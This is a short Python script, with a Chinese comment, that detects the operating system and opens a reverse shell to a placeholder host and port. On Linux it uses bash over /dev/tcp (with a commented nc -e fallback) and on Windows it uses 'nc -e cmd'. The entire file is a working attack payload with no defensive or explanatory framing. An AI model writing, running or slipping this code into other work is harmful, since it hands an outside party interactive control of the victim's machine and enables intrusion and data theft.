import os
import platform

# 获取操作系统名称
system_name = platform.system()
if system_name == 'Linux':
    os.system("bash -i >& /dev/tcp/ip/port 0>&1")
    #若有nc用nc ip port -e /bin/bash
if system_name == 'Windows':
    os.system("nc ip port -e cmd ")
